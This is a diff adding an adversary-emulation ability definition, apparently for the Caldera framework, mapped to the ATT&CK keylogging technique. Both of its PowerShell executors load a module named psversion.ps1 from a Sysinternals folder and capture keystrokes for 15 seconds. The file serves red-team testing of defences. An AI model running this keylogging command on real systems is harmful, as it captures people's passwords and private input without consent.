@@ -1,0 +1,51 @@
+ability_id: db28f68d-e8b8-46e6-b680-642570d4b257
+access: {}
+additional_info: {}
+buckets:
+- collection
+delete_payload: true
+description: Load custom PowerShell module, and grab keystrokes for 15 seconds.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n\
+    \  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist.\
+    \ Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program Files\\\
+    SysinternalsSuite\";\n. .\\psversion.ps1;\nGet-Keystrokes;\nStart-Sleep -Seconds\
+    \ 15;\nView-Job -JobName \"Keystrokes\";"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n\
+    \  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist.\
+    \ Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program Files\\\
+    SysinternalsSuite\";\n. .\\psversion.ps1;\nGet-Keystrokes;\nStart-Sleep -Seconds\
+    \ 15;\nView-Job -JobName \"Keystrokes\";"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Automated Collection (T1119) - Input Capture (T1417)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: collection
+technique_id: T1056.001
+technique_name: 'Input Capture: Keylogging'
